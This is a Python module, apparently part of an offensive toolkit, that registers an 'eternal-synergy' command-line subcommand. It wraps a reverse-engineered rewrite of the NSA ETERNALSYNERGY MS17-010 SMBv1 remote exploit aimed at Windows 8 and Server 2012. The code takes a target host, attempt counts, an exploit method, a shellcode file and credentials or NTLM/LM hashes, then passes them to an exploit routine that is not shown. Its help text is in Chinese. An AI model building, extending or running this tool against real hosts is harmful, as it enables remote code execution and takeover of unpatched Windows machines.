"""eternal-synergy — MS17-010 (ETERNALSYNERGY / ETSYNERGY) SMBv1 远程利用。

Python 重写的 NSA Eternalsynergy 利用工具 `Eternalsynergy-1.0.1.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 SMBv1/MS17-010 利用流程。
"""

from . import eternal_synergy


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def eternal_synergy_handle(args):
    """Run the ETERNALSYNERGY exploitation sequence against the supplied host."""
    return eternal_synergy.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        max_leak_attempts=args.max_leak_attempts,
        max_exploit_attempts=args.max_exploit_attempts,
        attempt_index=args.attempt_index,
        many_core_target=args.many_core_target,
        pipe=args.pipe,
        exploit_method=args.exploit_method,
        shellcode_file=args.shellcode_file,
        credentials=args.credentials,
        username=args.username,
        password=args.password,
        ntlm_hash=args.ntlm_hash,
        lm_hash=args.lm_hash,
        target_os=args.target_os,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `eternal-synergy` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eternal-synergy",
        help="MS17-010 (ETERNALSYNERGY / ETESYNERGY) SMBv1 远程利用",
        description="Python 重写的 NSA Eternalsynergy (ETESYNERGY / MS17-010) 利用工具 "
                    "Eternalsynergy-1.0.1。针对 Windows 8/Server 2012 SMBv1，"
                    "执行架构识别、exploit 缓冲构建与投递。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标 SMB 端口（默认 445）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--max-leak-attempts", type=int, default=7,
        help="MaxLeakAttempts：泄漏尝试次数（默认 7）",
    )
    p.add_argument(
        "--max-exploit-attempts", type=int, default=3,
        help="MaxExploitAttempts：利用尝试次数（默认 3）",
    )
    p.add_argument(
        "--attempt-index", type=int, default=0,
        help="AttemptIndex：已尝试次数（0-7，默认 0）",
    )
    p.add_argument(
        "--many-core-target", action="store_true",
        help="ManyCoreTarget：目标是否具有多核（8核或更多，物理或虚拟）",
    )
    p.add_argument(
        "--pipe", metavar="PIPE",
        help="命名管道名",
    )
    p.add_argument(
        "--exploit-method",
        choices=["Default", "Matched-pairs", "Classic-Synergy"],
        default="Default",
        help="利用方法（默认 Default）",
    )
    p.add_argument(
        "--shellcode-file", metavar="FILE",
        help="DOPU shellcode 文件（x64 专用）",
    )
    p.add_argument(
        "--credentials",
        choices=["Anonymous", "Guest", "Blank", "Password", "NTLM"],
        default="Anonymous",
        help="凭证类型（默认 Anonymous）",
    )
    p.add_argument(
        "--username", metavar="HEX",
        help="用户名（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--password", metavar="HEX",
        help="密码（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--ntlm-hash", metavar="HEX",
        help="NT 密码哈希（十六进制）",
    )
    p.add_argument(
        "--lm-hash", metavar="HEX",
        help="LM 密码哈希（十六进制）",
    )
    p.add_argument(
        "--target-os",
        choices=["WIN8_SP0", "SERVER_2K12_SP0"],
        default="WIN8_SP0",
        help="目标操作系统（默认 WIN8_SP0）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=eternal_synergy_handle)
